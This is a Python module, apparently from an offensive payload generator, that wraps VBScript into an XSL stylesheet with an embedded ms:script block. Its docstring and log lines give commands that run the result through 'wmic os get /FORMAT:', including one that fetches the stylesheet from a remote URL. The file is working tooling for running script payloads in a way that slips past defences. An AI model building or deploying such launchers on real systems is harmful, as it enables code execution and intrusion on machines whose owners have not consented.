#!/usr/bin/env python
# encoding: utf-8

import logging
from modules.vbs_gen import VBSGenerator

XSL_TEMPLATE = \
r"""<?xml version='1.0'?>
<stylesheet
    xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
    xmlns:user="placeholder"
    version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="VBScript"><![CDATA[ 

<<<VBS>>>
<<<MAIN>>>

]]>
</ms:script>
</stylesheet>
"""



class XSLGenerator(VBSGenerator):
    """ Module used to generate XSL file from working dir content
    To execute: 
    wmic os get /FORMAT:test.xsl
    Also work on remote files
    wmic os get /FORMAT:http://www.domain.blah/hello.xsl
    """
        
        
    def generate(self):
        logging.info(f" [+] Generating {self.outputFileType} file...")
        self.vbScriptConvert()
        with open(f"{self.getMainVBAFile()}.vbs") as f:
            vbsContent = f.read()
        XSL_ECHO= r"""CreateObject("WScript.Shell").Run("cmd /c echo XSLT does not handle output message! & PAUSE") '"""
        vbsContent = vbsContent.replace("WScript.Echo ", XSL_ECHO)

        # Write VBS in template
        xslContent = XSL_TEMPLATE
        xslContent = xslContent.replace("<<<VBS>>>", vbsContent)
        xslContent = xslContent.replace("<<<MAIN>>>", self.startFunction)
        with open(self.outputFilePath, 'w') as f:
            f.writelines(xslContent)
        logging.info(
            f"   [-] Generated {self.outputFileType} file: {self.outputFilePath}"
        )

        logging.info("   [-] Test with : \nwmic os get /FORMAT:\"%s\"\n" % self.outputFilePath)
        
        
        
        
        